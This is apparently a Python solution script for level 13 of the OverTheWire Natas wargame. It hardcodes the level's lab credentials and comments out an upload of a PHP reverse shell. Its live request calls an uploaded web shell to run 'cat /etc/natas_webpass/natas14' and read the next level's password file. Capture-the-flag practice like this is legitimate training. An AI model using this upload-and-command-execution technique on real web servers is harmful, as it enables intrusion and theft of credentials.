#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
import string

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits
passwd = list()

username = 'natas13'
password = 'lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

#response = session.get(url, auth=(username, password))
#response = session.post(url, files = {"uploadedfile" : open('revshell.php', 'rb')},data = {"filename":"revshell.php", "MAX_FILE_SIZE" : "1000"}, auth = (username, password))
response = session.get(url + 'upload/85b22dghpf.php?c=cat /etc/natas_webpass/natas14', auth = (username, password))


content = response.text
print(content)